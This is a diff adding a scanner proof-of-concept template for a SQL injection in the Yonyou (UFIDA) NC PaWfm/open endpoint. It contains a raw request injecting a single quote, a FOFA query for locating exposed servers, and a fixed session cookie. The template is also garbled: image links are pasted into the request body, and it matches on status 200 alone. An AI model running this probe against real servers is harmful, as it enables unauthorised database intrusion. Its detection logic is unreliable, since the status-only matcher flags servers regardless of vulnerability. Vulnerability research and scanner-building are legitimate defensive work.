@@ -1,0 +1,42 @@
+id: poc-fgg9x6wgo1yh3y87
+info:
+  name: 用友NC PaWfm open存在SQL 注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fgg9x6wgo1yh3y87'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fgg9x6wgo1yh3y87
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'GET /portal/pt/PaWfm/open?pageId=login&proDefPk=1'' HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: JSESSIONID=7717AB57F8AD7F26C97F76F77D494F04.ncMem01
+
+    Connection: close
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739792827865-ab632a58-9e1f-4d0b-bf4b-2ec34a452e29.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739792828197-b59ea85d-728f-4bb5-9759-a35d5d6e3bfc.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
